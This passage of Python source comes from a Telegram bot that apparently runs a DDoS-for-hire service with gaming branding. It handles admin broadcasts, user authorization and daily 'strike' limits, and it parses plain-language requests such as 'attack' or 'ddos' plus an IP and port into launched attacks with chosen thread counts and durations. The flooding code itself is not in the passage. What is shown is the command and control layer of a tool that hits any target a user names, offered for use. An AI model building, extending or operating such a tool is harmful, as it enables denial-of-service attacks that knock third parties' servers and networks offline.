                call.id, 
                "Only admins can broadcast messages!"
            )
            return
            
        try:
            # Parse data: confirm_broadcast_<chat_id>
            parts = data.split('_')
            if len(parts) != 3:
                raise ValueError("Invalid format")
                
            chat_id = int(parts[2])
            
            # Get broadcast message from temp data
            key = f"broadcast_{chat_id}"
            if key not in self.temp_data:
                await self.bot.answer_callback_query(
                    call.id, 
                    "Broadcast message expired or not found!"
                )
                return
                
            broadcast_message = self.temp_data[key]
            
            # Update button to show processing
            await self.bot.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=None
            )
            
            # Send "processing" message
            status_msg = await self.bot.send_message(
                chat_id=call.message.chat.id,
                text="📡 *Broadcasting message to all users...* 📡",
                parse_mode="Markdown"
            )
            
            # Send broadcast to all users
            users = await self.db.get_all_users()
            sent_count = 0
            failed_count = 0
            
            for user in users:
                try:
                    await self.bot.send_message(
                        user.user_id, 
                        broadcast_message,
                        parse_mode="Markdown"
                    )
                    sent_count += 1
                    
                    # Add small delay to avoid flooding
                    await asyncio.sleep(0.05)
                except Exception as e:
                    failed_count += 1
                    logger.error(f"Failed to send broadcast to user {user.user_id}: {str(e)}")
            
            # Update status message
            await self.bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=status_msg.message_id,
                text=f"🎉 *Squad Hyped!* War cries sent to {sent_count} users! ({failed_count} failed)",
                parse_mode="Markdown"
            )
            
            # Clean up temp data
            del self.temp_data[key]
            
            # Log activity
            await self.db.log_activity(
                admin_id, 
                "broadcast_sent", 
                {"sent": sent_count, "failed": failed_count}
            )
                
        except Exception as e:
            logger.error(f"Error in broadcast callback: {str(e)}")
            await self.bot.answer_callback_query(
                call.id, 
                "An error occurred during broadcast!"
            )
    
    async def handle_message(self, message: Message):
        """Handle general messages - AI-powered processing and IP/Port commands"""
        user_id = message.from_user.id
        chat_type = message.chat.type
        text = message.text.strip() if message.text else ""
        
        # Skip if not a text message
        if not text:
            return
            
        # Check authorization for private chats
        if chat_type == 'private':
            is_authorized = user_id in self.config.AUTHORIZED_USERS or await self._is_user_authorized(user_id)
            
            if not is_authorized:
                await self.bot.reply_to(
                    message, 
                    "🚫 *Warlord Squad Only!* Drop `/auth` to join the fray! 🔥\n\n*Built by Ibr, the BGMI Beast!*", 
                    parse_mode='Markdown'
                )
                return
        
        # Check rate limit for groups
        if chat_type in ('group', 'supergroup'):
            is_authorized = user_id in self.config.AUTHORIZED_USERS or await self._is_user_authorized(user_id)
            
            if not is_authorized:
                today_count = await self.db.get_today_action_count(user_id)
                if today_count >= self.config.RATE_LIMIT:
                    await self.bot.reply_to(
                        message, 
                        f"⛔ *Ammo Depleted!* You've fired {self.config.RATE_LIMIT} strikes today in this group!\n\n"
                        "🎯 *Go Warlord:* `/auth` in private for unlimited frags!",
                        parse_mode='Markdown'
                    )
                    return

        # AI-powered command processing (if enabled)
        if self.config.ENABLE_AI_COMMANDS:
            ai_processed = await self._process_ai_command(message, user_id, text, chat_type)
            if ai_processed:
                return

        # Get user profile and preferred mode for traditional IP/Port commands
        user = await self.db.get_user_profile(user_id)
        user_mode = UserMode.MANUAL
        thread_value = 200
        
        if user:
            user_mode = user.preferred_mode or UserMode.MANUAL
            thread_value = user.thread_value or 200

        # Process message based on mode
        text_lower = text.lower()
        if user_mode == UserMode.AUTO:
            await self._process_auto_mode(message, user_id, text_lower, chat_type, thread_value)
        else:
            await self._process_manual_mode(message, user_id, text_lower, chat_type, thread_value)

    async def _process_ai_command(self, message: Message, user_id: int, text: str, chat_type: str) -> bool:
        """Process natural language commands using AI understanding"""
        text_lower = text.lower()
        
        # AI-powered command patterns
        ai_patterns = {
            # Status and help patterns
            r'(what|how|help|guide|explain).*do|work|use': 'help',
            r'(status|active|running|current).*action': 'list_active',
            r'(my|user|account).*stats|statistics|info': 'stats',
            r'(history|past|previous).*attack|action': 'history',
            
            # Language change patterns  
            r'(change|set|switch).*language|lang': 'language',
            r'(speak|talk).*\b(spanish|french|german|russian|chinese|japanese)\b': 'language',
            
            # Attack patterns
            r'(attack|strike|hit|bomb|ddos|stress).*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})': 'attack_ip',
            r'(stop|halt|cease|end).*(all|everything|attack)': 'stop_all',
            
            # Mode switching patterns
            r'(switch|change|set).*auto.*mode': 'mode_auto',
            r'(switch|change|set).*manual.*mode': 'mode_manual',
            
            # Thread patterns
            r'(set|change|use).*thread.*(\d+)': 'set_thread',
            
            # Ping/test patterns
            r'(ping|test|check|alive|online)': 'ping',
            
            # Authentication patterns
            r'(auth|authorize|login|access)': 'auth'
        }
        
        # Check each pattern
        for pattern, command_type in ai_patterns.items():
            if re.search(pattern, text_lower):
                return await self._execute_ai_command(message, user_id, command_type, text, chat_type)
        
        # Check for IP patterns in natural language
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
        port_match = re.search(r'\bport\s*(\d{1,5})\b|\b(\d{1,5})\b.*port', text)
        duration_match = re.search(r'\b(\d{1,4})\s*(second|sec|s|minute|min|m)\b', text)
        
        if ip_match and (port_match or 'port' in text_lower):
            return await self._process_natural_attack(message, user_id, text, chat_type, ip_match, port_match, duration_match)
        
        return False
    
    async def _execute_ai_command(self, message: Message, user_id: int, command_type: str, text: str, chat_type: str) -> bool:
        """Execute AI-interpreted commands"""
        try:
            if command_type == 'help':
                await self.handle_help(message)
            elif command_type == 'list_active':
                await self.handle_list_active(message)
            elif command_type == 'stats':
                await self.handle_stats(message)
            elif command_type == 'history':
                await self.handle_history(message)
            elif command_type == 'language':
                await self._handle_ai_language_change(message, text)
            elif command_type == 'stop_all':
                await self._handle_ai_stop_all(message)
            elif command_type == 'mode_auto':
                await self._set_user_mode(message, user_id, UserMode.AUTO)
            elif command_type == 'mode_manual':
                await self._set_user_mode(message, user_id, UserMode.MANUAL)
            elif command_type == 'set_thread':
                thread_match = re.search(r'(\d+)', text)
                if thread_match:
                    await self._set_user_threads(message, user_id, int(thread_match.group(1)))
            elif command_type == 'ping':
                await self.handle_ping(message)
            elif command_type == 'auth':
                await self.handle_auth(message)
            
            return True
        except Exception as e:
            logger.error(f"Error executing AI command: {str(e)}")
            return False
    
    async def _process_natural_attack(self, message: Message, user_id: int, text: str, chat_type: str, 
                                     ip_match, port_match, duration_match) -> bool:
        """Process natural language attack commands"""
        try:
            ip = ip_match.group(1)
            
            # Extract port
            port = None
            if port_match:
                port = int(port_match.group(1) or port_match.group(2))
            else:
                # Common port defaults based on context
                if 'web' in text.lower() or 'http' in text.lower():
                    port = 80
                elif 'https' in text.lower() or 'ssl' in text.lower():
                    port = 443
                elif 'ssh' in text.lower():
                    port = 22
                else:
                    await self.bot.reply_to(
                        message,
                        "🤖 *AI Understanding:* I found the IP but need the port!\n"
                        "Try: `attack 192.168.1.1 port 8080` or `hit 192.168.1.1:8080`",
                        parse_mode='Markdown'
                    )
                    return True
            
            # Extract duration
            duration = None
            if duration_match:
                duration_val = int(duration_match.group(1))
                unit = duration_match.group(2).lower()
                if unit.startswith('m'):
                    duration = duration_val * 60
                else:
                    duration = duration_val
            
            # Get user settings
            user = await self.db.get_user_profile(user_id)
            thread_value = user.thread_value if user else 200
            
            # Validate inputs
            if not self._validate_input(message, ip, port, duration):
                return True
            
            # Use auto mode duration if not specified
            if duration is None:
                duration = random.randint(80, 240)
                
            # Send AI confirmation
            await self.bot.reply_to(
                message,
                f"🤖 *AI Command Understood!*\n\n"
                f"🎯 *Target:* `{ip}:{port}`\n"
                f"⏱ *Duration:* `{duration}s`\n"
                f"🔫 *Threads:* `{thread_value}`\n\n"
                "🚀 *Launching strike...*",
                parse_mode='Markdown'
            )
            
            # Start the action
            await self._start_action(message, user_id, ip, port, duration, UserMode.AUTO, chat_type, thread_value)
            return True
            
        except Exception as e:
            logger.error(f"Error processing natural attack: {str(e)}")
            await self.bot.reply_to(
                message,
                "🤖 *AI Error:* Couldn't process that command. Try the standard format!",
                parse_mode='Markdown'
            )
            return True
    
    async def _handle_ai_language_change(self, message: Message, text: str):
        """Handle AI-detected language change requests"""
        # Extract language from text
        lang_patterns = {
            'spanish': 'es', 'español': 'es',
            'french': 'fr', 'français': 'fr', 'francais': 'fr',
            'german': 'de', 'deutsch': 'de',
            'russian': 'ru', 'русский': 'ru',
            'chinese': 'zh', '中文': 'zh',
            'japanese': 'ja', '日本語': 'ja',
            'hindi': 'hi', 'हिंदी': 'hi', 'हिन्दी': 'hi',
            'english': 'en'
        }
        
        text_lower = text.lower()
        for lang_name, lang_code in lang_patterns.items():
            if lang_name in text_lower:
                # Simulate /language command with argument
                message.text = f"/language {lang_code}"
                await self.handle_language(message)
                return
        
        # If no specific language detected, show options
        await self.handle_language(message)
    
    async def _handle_ai_stop_all(self, message: Message):
        """Handle AI-detected stop all requests"""
        # Simulate the "stop all" text message
        stop_message = message
        stop_message.text = "stop all"
        await self.handle_stop_all(stop_message)
    
    async def _set_user_mode(self, message: Message, user_id: int, mode: UserMode):
        """Set user's preferred mode via AI command"""
        user = await self.db.get_user_profile(user_id)
        if user:
            user.preferred_mode = mode
            await self.db.save_user_profile(user)
            
            mode_name = "Auto" if mode == UserMode.AUTO else "Manual"
            await self.bot.reply_to(
                message,
                f"🤖 *AI Mode Switch:* Set to **{mode_name} Mode**!\n\n"
                f"{'📱 *Auto:* Just send `IP PORT`' if mode == UserMode.AUTO else '⚙️ *Manual:* Send `IP PORT DURATION`'}",
                parse_mode='Markdown'
            )
    
    async def _set_user_threads(self, message: Message, user_id: int, threads: int):
        """Set user's thread count via AI command"""
        if not self.config.MIN_THREAD_COUNT <= threads <= self.config.MAX_THREAD_COUNT:
            await self.bot.reply_to(
                message,
                f"🤖 *AI Validation:* Threads must be {self.config.MIN_THREAD_COUNT}-{self.config.MAX_THREAD_COUNT}!",
                parse_mode='Markdown'
            )
            return
        
        user = await self.db.get_user_profile(user_id)
        if user:
            user.thread_value = threads
            await self.db.save_user_profile(user)
            
            await self.bot.reply_to(
                message,
                f"🤖 *AI Thread Update:* Set to **{threads} threads**! 🔥",
                parse_mode='Markdown'
            )